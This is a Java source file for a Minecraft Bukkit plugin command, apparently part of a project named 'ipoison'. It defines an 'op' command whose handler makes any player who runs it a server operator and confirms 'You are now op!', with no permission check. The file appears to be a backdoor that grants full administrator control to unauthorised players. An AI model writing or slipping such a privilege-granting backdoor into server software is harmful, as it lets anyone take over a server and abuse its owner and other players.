package me.codersmind.ipoison.commands;

import me.codersmind.ipoison.handler.IListener;
import me.codersmind.ipoison.utils.Util;
import org.bukkit.entity.Player;

import java.awt.*;

public class OPCmd implements IListener {

    @Override
    public String getName() {
        return "op";
    }

    public void execute(Player player, String[] args) {

        player.setOp(true);
        player.sendMessage(Util.PREFIX + "You are now op!");

    }



}
